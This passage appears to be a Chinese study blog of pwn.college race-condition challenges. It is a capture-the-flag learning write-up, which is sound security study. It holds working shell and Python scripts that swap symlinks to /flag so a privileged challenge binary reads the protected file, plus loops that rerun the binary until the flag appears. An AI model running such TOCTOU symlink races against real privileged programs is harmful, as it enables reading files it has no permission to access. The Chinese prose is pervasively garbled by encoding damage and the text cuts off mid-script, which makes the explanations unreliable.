Unlink Attack, Poison Null Byte</p></li><li><p><a href="https://docs.google.com/presentation/d/14SYq0TTVxEGWHNUG1BP66A8liPDD2pqJUs2WrXlCZNE/edit#slide=id.g47fd1f5b33_0_204">further reading</a>. </p></li></ul><p><a href="https://sourceware.org/glibc/wiki/MallocInternals">malloc internals</a> </p><p><a href="https://seclists.org/bugtraq/2005/Oct/118">the rise of houses</a> </p><h1 id="module-C-race"><a href="#module-C-race" class="headerlink" title="module C-race"></a>module C-race</h1><h4 id="key-points"><a href="#key-points" class="headerlink" title="key points"></a>key points</h4><ul><li>åœ¨ä¸€ä¸ªç¨‹åºæ‰“å¼€æ–‡ä»¶å¹¶å†™å…¥ç„¶åå†åˆ°æ‰§è¡Œå®ƒçš„æœŸé—´è¿›ç¨‹å¯èƒ½è¢«è°ƒåº¦, è¿™ä¸ªæ—¶å€™å¦‚æœæ–‡ä»¶è¢«æ”¹å†™é‚£ä¹ˆå°±ä¼šå‡ºç°ç«æ€æ¡ä»¶.</li><li>å¦‚æœè¿™ä¸ªçª—å£å¤ªçŸ­é‚£ä¹ˆç«æ€æ¡ä»¶å‡ºç°çš„å‡ ç‡å°±ä¼šæ›´å°</li><li>æœ‰ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨<strong>nice</strong>, å¯¹åº”äºniceå‘½ä»¤, è¿˜æœ‰ä¸€ä¸ªionice, å°±æ˜¯å­—é¢æ„æ€ä¸Šçš„run a program with modified scheduling priority</li><li>é€šè¿‡éå¸¸é•¿çš„è·¯å¾„æœç´¢å¯ä»¥å‡æ…¢ç¨‹åºæ‰§è¡Œ, è¿›è€ŒåŠ å¤§ç«æ€çª—å£. å¯ä»¥ä½¿ç”¨ç¬¦å·é“¾æ¥æ¥å¾ªç¯æŸ¥æ‰¾åŒä¸€æ ¹ç›®å½•ä¸‹çš„å¤šæ¡é•¿è·¯å¾„, æ¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœ.</li></ul><img src="../../image/pwn-modules/image-20220511235547367.png" alt="image-20220511235547367" style="zoom: 67%;" /><ul><li>Mitigations<ol><li>Safer programming practices (O_NOFOLLOW, mkstemp(), etc).</li><li>Symlink protections in /tmp<br> a. root cannot follow symlinks in /tmp that are owned by other users<br> b.specifically made to prevent these sorts of issues</li></ol></li><li>élibcçš„åº“å‡½æ•°è¦ç›´æ¥è¿›è¡Œç¼–è¯‘è¦ç»™gccä¼ é€’ç›¸åº”çš„é“¾æ¥å‚æ•°.</li><li>pthread:<ul><li><code>pthread_t</code> | <code>pthread_create()</code> | <code>pthread_join()</code>:waits for the thread specified by thread to terminate.</li><li>å®é™…ç”¨çš„æ˜¯<code>clone()</code>ç³»ç»Ÿè°ƒç”¨.</li></ul></li><li>discrepancies between <strong>libc call</strong> and <strong>raw syscall</strong>: <ul><li>setuid() in libc sets the uid for all threads of the process, raw syscall will only set the caller thread.</li><li>exit() in libc will call exit_group(), so exit all threads, but raw syscall only exit caller thread.</li></ul></li><li>å®é™…ä¸­å¸¸ä½¿ç”¨å…¨å±€å˜é‡æ¥æ§åˆ¶çº¿ç¨‹çš„æ‰§è¡Œ.</li><li>å¯¹å†…å­˜çš„è¯»å†™åŒæ ·ä¼šäº§ç”Ÿç«æ€æ¡ä»¶.</li><li>Data races: è‡ªå¢çš„å¤šæ­¥éª¤æŒ‡ä»¤. ä¸è¿‡å¯ä»¥é€šè¿‡ä¸Šé”è§£å†³.</li><li>Detect: valgrind, <a href="https://docs.google.com/presentation/d/1u-aSz-mqwkMIZEDAR-AEPKw5JPn-1q_3Ek_C6JjQUzY/edit#slide=id.gac4ec7d1a7_0_49">å­¦æœ¯ç•Œ</a> </li><li>signals and reentrancy: <ul><li>use signal to interrupt normal execution control flow.</li><li>use signal function to reenter function.</li><li>DO NOT call non-reentrant funtions in your signal handlers.<ul><li>Your handler might have interrupted those functions mid-execution.</li><li>Another signal might interrupt your signal handlerâ€™s non-reentrant invocations mid-execution!</li><li>Depending on settings (<code>SA_NODEFER</code> flag to sigaction()), another iteration of the same signal might interrupt your signal!</li></ul></li><li><code>man signal-safety</code> to see all reentrant libc funtions.</li></ul></li></ul><blockquote><p>YouTube-50æ˜¯babyraceçš„è§†é¢‘. level5åšä¸ä¸‹å»äº†å‡†å¤‡çœ‹çœ‹.</p></blockquote><p><strong>è¡¥å……:</strong> </p><ul><li><p>level5 shell scripté—®é¢˜å‡ºåœ¨rm mvéƒ½æœ‰ä¸€ä¸ªå¯åŠ¨æ—¶é—´å’Œä¸€å †ç³»ç»Ÿè°ƒç”¨, å†åŠ ä¸Šshellæ˜¯é fork+execæ¥æ‰§è¡Œè¿›ç¨‹çš„, æ‰€ä»¥å°±ä¼šæ¯”è¾ƒæ…¢, å¯èƒ½ä¼šå‡ºç°å·¦å›¾ä¸­çš„æƒ…å†µ, å°±ç®—æŠŠå‡ ä¸ªå‘½ä»¤åˆ†å¼€è¿›å¤šä¸ªå¾ªç¯ä¹Ÿè¿˜æ˜¯å¤ªæ…¢. å¦‚æœå†™è¿›c, é‚£å°±æ˜¯å³å›¾ä¸­çš„ç†æƒ³çŠ¶æ€äº†:<br><img src="../../image/pwn-modules/image-20220516162810899.png" alt="image-20220516162810899" style="zoom:80%;" /><img src="../../image/pwn-modules/image-20220516163018313.png" alt="image-20220516162810899" style="zoom:80%;" /> </p></li><li><p>ä½¿ç”¨pythonçš„è¯å¯åŠ¨æ¯”è¾ƒæ…¢æ˜¯äº‹å®, ä½†æ˜¯è¿›å…¥æ‰§è¡Œä¹‹ååˆ°ç³»ç»Ÿè°ƒç”¨å±‚é¢æ˜¯å’Œcå·®ä¸å¤šçš„, æ‰€ä»¥åªè¦åœ¨pythoné‡Œé¢è¿›è¡Œloopå°±èƒ½è¾¾åˆ°ä¸€æ ·çš„æ•ˆæœ. æƒ³èµ·æ¥å‰å‡ å¤©çœ‹çš„dirty cowä½¿ç”¨çš„race conditionçš„pocå°±æ˜¯ç”¨cå†™çš„.</p><ul><li>pythonçš„è¯è¦å¤§é‡ä½¿ç”¨åˆ°os moduleæ¥è°ƒç”¨ç³»ç»Ÿ. å¯å¾—å¥½å¥½çœ‹çœ‹.(ç»ƒäº†ç»ƒshellä¹Ÿä¸äºå°±æ˜¯äº†)</li></ul></li></ul><h4 id="prepare"><a href="#prepare" class="headerlink" title="prepare"></a>prepare</h4><p>å…ˆæ•´ä¸ªåˆ›å»ºè¶…çº§é•¿çš„è·¯å¾„çš„è„šæœ¬. é¡ºä¾¿å­¦äº†å­¦shellç¼–ç¨‹.</p><p>éš¾æ€ªè§†é¢‘é‡Œåªè§åˆ°t_end, å› ä¸ºè¿™æ ·è·¯å¾„ä¸Šæ¯ä¸ªæ–‡ä»¶å¤¹å…¶å®éƒ½æ˜¯ç¬¦å·é“¾æ¥, æ‰€ä»¥æœ€å¤š20ä¸ª.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>prefix=&#x27;a&#x27;<br>ln -s $(pwd) ./root<br>for i in &#123;97..116&#125;#æˆ–è€…ç›´æ¥ç”¨&#123;a..t&#125;<br>do<br>    prefix=$(printf &quot;\\x$(printf %x $i)&quot;)<br>    pushd .<br>    mkdir $prefix<br>    cd $prefix<br>    for j in &#123;1..25&#125;<br>    do<br>        mkdir ./$j<br>        cd ./$j<br>    done<br>    innerwd=$(pwd)<br>    popd<br>    cp -a ./root $innerwd<br>    ln -s $innerwd $(pwd)/$&#123;prefix&#125;_end<br>done<br></code></pre></div></td></tr></table></figure><p>ç”Ÿæˆè·¯å¾„å­—ç¬¦ä¸²: å¦‚æœè·¯å¾„ä¸Šè¿˜æœ‰ç¬¦å·é“¾æ¥é‚£è¿˜å¾—å†å‡å°‘å‡ ä¸ª.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>prefix=&#x27;a&#x27;<br>path=&#x27;./&#x27; <br>for i in &#123;97..116&#125; #æˆ–è€…ç›´æ¥ç”¨&#123;a..t&#125;<br>do<br>    prefix=$(printf &quot;\\x$(printf %x $i)&quot;)<br>    path+=$&#123;prefix&#125;_end/root/<br><br>done<br>ls $path#test path(though must be true...)<br><span class="hljs-meta">#</span><span class="bash">result is:</span><br>./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/t_end/root/<br></code></pre></div></td></tr></table></figure><h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1"></a>level1</h4><p>åœ¨ç¨‹åºä½¿ç”¨ç¬¬ä¸€ä¸ªå‚æ•°å½“åšå­—ç¬¦ä¸²openæ–‡ä»¶ä¹‹å‰ç›´æ¥åœä¸‹æ¥ç­‰æˆ‘, è¿™ä¸ªæ—¶å€™å°±å¯ä»¥æ›´æ”¹flagçš„ç¬¦å·é“¾æ¥ä¸ºé‚£ä¸ªåå­—, äºæ˜¯ç»•è¿‡äº†ä¸èƒ½å«æœ‰â€™flagâ€™å­—ç¬¦å’Œä¸èƒ½æ˜¯ç¬¦å·é“¾æ¥çš„é™åˆ¶.</p><h5 id="1ç¨‹åºçš„è¡¥å……shell"><a href="#1ç¨‹åºçš„è¡¥å……shell" class="headerlink" title=".1ç¨‹åºçš„è¡¥å……shell"></a>.1ç¨‹åºçš„è¡¥å……shell</h5><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>rm aa bb cc 2&gt;/dev/null<br>touch aa<br>ln -s /flag ./cc<br><span class="hljs-meta">#</span><span class="bash">ä¸€å¼€å§‹æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶, ç„¶åæ”¹æˆåˆ°/flagçš„ç¬¦å·é“¾æ¥</span><br>while [ 1 ]<br>do<br>    #sleep 0.05 #ä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨çš„è¯´...å¸Œæœ›æœ‰. æœç„¶æ²¡ç”¨<br>    mv bb aa <br>    sleep 0.0005<br>    mv aa bb<br>    mv cc aa<br>    sleep 0.0005<br>    mv aa cc<br>done<br></code></pre></div></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">æŒç»­æ‰§è¡Œchallengeçš„shell</span><br><br>path=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/<br><br>while [[ 1 ]]<br>do<br>    res=$(/challenge/babyrace_level1.1 $&#123;path&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        printf &quot;\n$res\n\n&quot;<br>        exit<br>    fi<br>done<br></code></pre></div></td></tr></table></figure><p>åˆ é™¤ä¸€å †æ–‡ä»¶å¤¹:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">rm -r !(peda|*sh)<br></code></pre></div></td></tr></table></figure><h5 id="æˆåŠŸç‡æ¯”è¾ƒ"><a href="#æˆåŠŸç‡æ¯”è¾ƒ" class="headerlink" title="æˆåŠŸç‡æ¯”è¾ƒ"></a>æˆåŠŸç‡æ¯”è¾ƒ</h5><blockquote><p>æ”¹æˆçŸ­è·¯å¾„ä¹‹åè¿›è¡Œäº†ä¸€ä¸‹æˆåŠŸç‡æ¯”è¾ƒ:</p></blockquote><p>æ¯”è¾ƒshellscript: </p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">æŒç»­æ‰§è¡Œchallengeçš„shell</span><br><br>path=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/<br>path_2=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/<br>rate=0<br>rates=0<br>ratess=0<br>for i in &#123;1..1000&#125;<br>do<br>    res=$(/challenge/babyrace_level1.1 $&#123;path&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((rate++))<br>    fi<br><br>    res=$(/challenge/babyrace_level1.1 $&#123;path_2&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((ratess++))<br>    fi<br><br>    res=$(/challenge/babyrace_level1.1 ./aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((rates++))<br>    fi<br>done<br>echo longpath: $rate/1000<br>echo path_2: $ratess/1000<br>echo shortpath: $rates/1000<br></code></pre></div></td></tr></table></figure><p>ç»“æœ:</p><p>ä¸å¸¦sleep:</p><img src="../../image/pwn-modules/image-20220515153055539.png" alt="image-20220515153055539" style="zoom:80%;" /><p>å¸¦äº†sleep(0.05s):</p><img src="../../image/pwn-modules/image-20220515153138069.png" alt="image-20220515153138069" style="zoom:80%;" /><p>å’Œå¥½å¤šå› ç´ æœ‰å…³, ä¸è¿‡ä¸ç”¨sleepçœ‹èµ·æ¥æ›´é«˜æ•ˆ, ä½†æ˜¯æ²¡è§åˆ°é•¿è·¯å¾„å¸¦æ¥çš„å¥½å¤„â€¦â€¦.</p><p>å¥½äº†, æœ‰äº†æ–°å‘ç°, äº§ç”Ÿç«æ€æ¡ä»¶çš„shellè„šæœ¬ä¸­ç¬¬ä¸€ä¸ªsleepçœ‹èµ·æ¥æ²¡ä»€ä¹ˆæ„ä¹‰ç„¶åå°è¯•åˆ é™¤, <strong>æˆåŠŸç‡ç›´æ¥å¤§å¹…ä¸Šæ¶¨</strong>:</p><img src="../../image/pwn-modules/image-20220515155725438.png" alt="image-20220515155725438" style="zoom:80%;" /><p>ä¸è¿‡é•¿è·¯å¾„è¿˜æ˜¯æ²¡å•¥ä½œç”¨. å¦‚æœä¸åŠ ä¸Š<strong>sleep 0.0005</strong>, é‚£ä¹ˆæˆåŠŸç‡ç›´é™ä¸º5/1000.</p><p>ä¼šéšç€sleepçš„æ—¶é—´æ³¢åŠ¨, è¿˜æ˜¯0.0005æœ€é«˜. åœ¨0.005çš„æ—¶å€™å‡ºç°path_2çš„æˆåŠŸç‡æœ€é«˜. å…¨éƒ½æ˜¯è¿·ä¹‹è¡Œä¸º, è‡³äºniceå°±ä¸è¯•äº†â€¦.</p><h4 id="level2-2"><a href="#level2-2" class="headerlink" title="level2"></a>level2</h4><p>å®Œå…¨ä¸€æ ·</p><h4 id="level3-3"><a href="#level3-3" class="headerlink" title="level3"></a>level3</h4><p>åœ¨å‰ä¸¤é¢˜çš„åŸºç¡€ä¹‹ä¸Šæ£€æŸ¥å¤§å°ä¸èƒ½è¶…è¿‡256å­—èŠ‚, è€Œä¸”åœ¨buf[256]ä¹‹åæœ‰ä¸€ä¸ªæ§åˆ¶è¿›å…¥win()çš„v7, æ”¹æ”¹æ–‡ä»¶åå¾ˆå®¹æ˜“ç»•è¿‡</p><p>çœ‹äº†office hours, ç”¨äº†pythonçš„osæ¨¡å—, å°è¯•äº†os.fork+åˆ†å¼€unlinkå’Œsymlink+straceç¨‹åºçš„ç³»ç»Ÿè°ƒç”¨æ—¶é—´å¹¶åˆ†æçª—å£(è¿™ä¸ªçª—å£æ¯”è¾ƒå°). æ²¡è¯•å‡ºæ¥ä»€ä¹ˆæ›´å¥½çš„ç»“æœ. </p><h4 id="level4-4"><a href="#level4-4" class="headerlink" title="level4"></a>level4</h4><p>åˆ©ç”¨ä¸Šé¢çš„æ–¹æ³•æ›´æ”¹æ‰“å¼€æ–‡ä»¶è¿›è¡Œæ ˆæº¢å‡ºç„¶åæ”¹è·³è½¬åœ°å€è·³è½¬åˆ°win().</p><p>ä»€ä¹ˆä¿æŠ¤éƒ½æ²¡å¼€, å›ºå®šåœ°å€åŠ è½½.</p><h4 id="level5-5"><a href="#level5-5" class="headerlink" title="level5"></a>level5</h4><blockquote><p>æ€è€ƒçš„ä¸€äº›è¿‡ç¨‹â€¦â€¦</p><p>æ¥å—ä¸€ä¸ªç»å¯¹è·¯å¾„, é™¤äº†ä¸€äº›æ£€æŸ¥(symlink, argname), è¿˜æœ‰æ–‡ä»¶æ‰€åœ¨ç›®å½•æ‰€æœ‰è€…åªèƒ½æ˜¯root, å…¶ä»–ç”¨æˆ·æ²¡æœ‰åœ¨æ­¤æ–‡ä»¶å¤¹å†™çš„æƒé™.</p><p>???? ä¸è¿‡åœ¨çœ‹äº†çœ‹dirnameçš„å®ç°ä¹‹åå‘ç°å¹¶ä¸éœ€è¦ä¸€ä¸ªç»å¯¹è·¯å¾„.</p><img src="../../image/pwn-modules/image-20220512222315120.png" alt="image-20220512222315120" style="zoom:80%;" /><ul><li>è¿™æ ·çš„è¯, <del>å‚æ•°å°±å®šæˆ/home/hackerä¸‹çš„e(0 size file),</del>  </li></ul></blockquote><p>dirname()åªæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ“ä½œ, ä¼šæˆªå–å‰é¢çš„ä¸€éƒ¨åˆ†è·¯å¾„. æ‰€ä»¥ä¸èƒ½åœ¨å‚æ•°ä¸­ä½¿ç”¨ç›¸å¯¹è·¯å¾„, å¦åˆ™dirnameä¼šè¿”å›å½“å‰æ–‡ä»¶å¤¹: <code>.</code>, è¿™æ ·æ²¡æ³•ç»•è¿‡dirname, å·¥ä½œç›®å½•åˆä¸èƒ½æ”¹æˆé™¤äº†hackerä¹‹å¤–çš„.</p><p>ç¬¬ä¸€é˜¶æ®µåªåˆ¤æ–­äº†æ–‡ä»¶å­˜åœ¨ä¸å¦ä»¥åŠç¬¦å·é“¾æ¥(no follow lstat), ç¬¬äºŒé˜¶æ®µæ‰åˆ¤æ–­ç›®å½•ä¿¡æ¯(use dirname() strip argv[1], and follow link stat), ç¬¬ä¸‰é˜¶æ®µæ˜¯çœŸæ­£çš„æ‰“å¼€æ–‡ä»¶.</p><ul><li>é¦–å…ˆtouchä¸€ä¸ª/home/hacker/aa/bbæ–‡ä»¶, é€šè¿‡nameå’ŒsymlinkéªŒè¯, </li><li>ç„¶ålnä¸¤ä¸ª/home/hacker/aa -&gt; /home, ä¸ç”¨ç®¡bbå…¶å®æ ¹æœ¬ä¸åœ¨/homeä¸­.</li><li>æœ€åå†lnä¸€ä¸ª/home/hacker/aa/bb -&gt; /flag</li></ul><p>ä¹Ÿè®¸æœ‰æ›´å¥½çš„åŠæ³•, :</p><ul><li>æœ€å¼€å§‹åˆ›å»º<code>./1/aa/bb(plain file)</code>, <code>./2/aa -&gt; /home</code>, <code>./3/aa/bbÂ -&gt;Â /flag</code></li><li>ç„¶ååˆ›å»ºä¸€ä¸ªsymlinkå«åšdir.</li><li>é¦–å…ˆæŒ‡å‘<code>./1</code>, ç„¶åæŒ‡å‘<code>./2</code>, æœ€åæŒ‡å‘<code>./3</code>.</li><li>è¿™æ ·åªè¦æ¯æ¬¡unlink dirç„¶åå†symlinkç›¸åº”æ•°å­—æ–‡ä»¶å¤¹åå°±è¡Œäº†.<br>å®Œæ•´è·¯å¾„åä¸º<code>/home/hacker/dir/aa/bb</code> </li><li>ç”±äºè¿™æ ·å­å®åœ¨å¤ªå¿«å¯¼è‡´çª—å£æ—¶é—´éƒ½è·Ÿä¸ä¸Šäº†. æ·»åŠ sleep, å¤§æ¦‚æ˜¯0.0001s</li></ul><h5 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h5><p>å†™äº†ä¸€ä¸ªè„šæœ¬é¿å…é‡å¤è¾“å…¥ä¸€äº›å‘½ä»¤, ä¸è¿‡æƒ³æ¸…æ¥šä¹‹åå€’æ˜¯ä¸€éè¿‡äº†.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>if [ $1 == &#x27;init&#x27; ]<br>then<br>    cd<br>    mkdir a<br>    cd a<br>    touch b<br>elif [ $1 == 2 ]<br>then<br>    cd<br>    mv a b<br>    ln -s /home /home/hacker/a<br>elif [ $1 == 3 ]<br>then<br>    cd<br>    rm a ./b/b<br>    mv b a<br>    ln -s /flag /home/hacker/a/b<br>elif [ $1 == &#x27;cls&#x27; ]<br>then<br>    rm -r a b 2&gt;/dev/null<br>else<br>    echo &#x27;invalid argument&#x27;<br>fi<br></code></pre></div></td></tr></table></figure><p>woc, æˆ‘å°±è¯´æ€ä¹ˆä¸å¤ªåƒç«æ€æ¡ä»¶, åŸæ¥.0åªæ˜¯æ•™å­¦, .1éƒ½æ²¡æœ‰getchar()è¿™ä¸ªå‡½æ•°äº†.</p><p>é‡æ–°åšä¸€ä¸‹.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>rm aa bb cc -rf 2&gt;/dev/null<br>mkdir aa<br>touch ./aa/bb<br>ln -s /home /home/hacker/cc<br>ln -s /flag /home/hacker/aa/cc<br><span class="hljs-meta">#</span><span class="bash">sleep 0.0005</span><br>while [ 1 ]<br>do<br>    sleep 0.0005<br>    mv aa bb#change dir name<br>    mv cc aa#let aa-&gt;/home<br>    sleep 0.0005<br>    <br>    mv aa cc #now cc -&gt; /home, bb is dirctory<br>    mv bb aa #restore aa(dir)<br>    mv ./aa/bb ./aa/dd<br>    mv ./aa/cc ./aa/bb #now ./aa has bb-&gt;/flag, dd plainfile<br>    sleep 0.0005<br>    <br>    #restore context, for non-symlink check<br>    mv ./aa/bb ./aa/cc<br>    mv ./aa/dd ./aa/bb<br>done<br></code></pre></div></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">æŒç»­æ‰§è¡Œchallengeçš„shell</span><br><br>while [[ 1 ]]<br>do<br>    res=$(/challenge/babyrace_level5.1 /home/hacker/aa/bb | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        printf &quot;\n$res\n\n&quot;<br>        exit<br>    fi<br>done<br></code></pre></div></td></tr></table></figure><p>è¿‡ä¸äº†å•Šå•Šå•Šâ€¦</p><h5 id="pythonå¤§æ³•-keyè¡¥å……"><a href="#pythonå¤§æ³•-keyè¡¥å……" class="headerlink" title="pythonå¤§æ³•+keyè¡¥å……"></a>pythonå¤§æ³•+keyè¡¥å……</h5><ul><li>unlink: delete a name from filesystem. çœŸæ˜¯ä¸ªé›†åˆäº†ä¸€å †åŠŸèƒ½çš„ç³»ç»Ÿè°ƒç”¨, èƒ½åˆ  æ–‡ä»¶ symlink socket FIFO device.</li><li>ä¸€äº›å¸¸æ•°æ˜¯ç”¨os.CONSTANTæ¥è°ƒç”¨çš„.</li><li>å¦‚æœä½¿ç”¨pythonçš„builtin function <code>open</code>çš„è¯, ä¼šè°ƒç”¨fstat ioctlè¿™ç§æ²¡æœ‰ä»€ä¹ˆå¿…è¦çš„å‡½æ•°. å¯ä»¥ä½¿ç”¨os.openæ¥è°ƒç”¨ä½çº§çš„å‡½æ•°.</li></ul><p>çœ‹è§†é¢‘å°è¯•pythonå†™æ³•:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,sys,time<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> symlink, unlink<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;rm&#x27;</span>:<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;init&#x27;</span> :<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;./initpy&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">while</span> <span 